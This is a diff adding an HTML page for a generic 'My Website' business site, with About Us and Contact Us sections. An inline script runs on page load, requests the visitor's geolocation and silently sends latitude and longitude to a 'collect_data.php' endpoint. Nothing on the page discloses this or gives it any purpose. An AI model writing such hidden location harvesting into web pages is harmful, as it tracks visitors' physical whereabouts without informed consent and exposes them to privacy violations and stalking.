@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Website</title>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+</head>
+<body onload="getLocation()">
+  <div class="container">
+    <header>
+      <h1>Welcome to My Website</h1>
+      <p>Explore our services and learn more about us.</p>
+    </header>
+    
+    <!-- Main content area -->
+    <main>
+      <section>
+        <h2>About Us</h2>
+        <p>We offer a variety of services to help you achieve your goals. Learn more about our team and our mission.</p>
+      </section>
+      
+      <section>
+        <h2>Contact Us</h2>
+        <p>Feel free to get in touch with us through our contact page.</p>
+      </section>
+    </main>
+
+    <footer>
+      <p>© 2024 My Website. All rights reserved.</p>
+    </footer>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else { 
+        console.log("Geolocation is not supported by this browser.");
+      }
+    }
+
+    function sendLocation(position) {
+      // Send location data to server
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      const xhttp = new XMLHttpRequest();
+      xhttp.open("GET", "collect_data.php?lat=" + latitude + "&long=" + longitude, true);
+      xhttp.send();
+    }
+
+    function handleError(error) {
+      console.log("Error occurred: " + error.message);
+    }
+  </script>
+</body>
+</html>
